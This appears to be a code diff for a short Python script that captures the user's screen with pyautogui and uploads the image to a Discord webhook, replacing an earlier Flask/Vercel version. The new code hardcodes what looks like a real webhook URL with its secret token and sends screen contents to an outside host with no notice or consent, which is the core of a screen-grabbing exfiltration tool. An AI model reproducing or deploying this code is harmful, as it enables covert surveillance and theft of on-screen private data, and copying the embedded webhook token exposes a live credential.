@@ -1,32 +1,19 @@
-from flask import Flask, send_file
 import pyautogui
 import requests
-import os
 
-app = Flask(__name__)
+# Your Discord Webhook URL
+WEBHOOK_URL = "https://discord.com/api/webhooks/1342227822261047356/RtOuOXGBJEBwS6VCo_K7IHuQha1-oed1Twa1riIfjsC6WCFUhc50rurVRKeXXJPGgDwj"  # Replace with your actual webhook URL
 
-WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK")  # Use environment variable for security
+# Capture a screenshot
+screenshot = pyautogui.screenshot()
+screenshot.save("screenshot.png")
 
-@app.route("/", methods=["GET"])
-def capture_screenshot():
-    try:
-        # Capture screenshot
-        screenshot = pyautogui.screenshot()
-        screenshot_path = "/tmp/screenshot.png"  # Use /tmp because Vercel is serverless
-        screenshot.save(screenshot_path)
+# Send the screenshot to Discord
+with open("screenshot.png", "rb") as file:
+    response = requests.post(WEBHOOK_URL, files={"file": file})
 
-        # Send screenshot to Discord
-        with open(screenshot_path, "rb") as file:
-            requests.post(WEBHOOK_URL, files={"file": file})
-
-        return "Screenshot taken and sent to Discord!", 200
-
-    except Exception as e:
-        return f"Error: {str(e)}", 500
-
-# Required for Vercel
-def handler(event, context):
-    return app(event, context)
-
-if __name__ == "__main__":
-    app.run(debug=True)
+# Check if the request was successful
+if response.status_code == 200 or response.status_code == 204:
+    print("Screenshot sent successfully!")
+else:
+    print("Failed to send:", response.text)
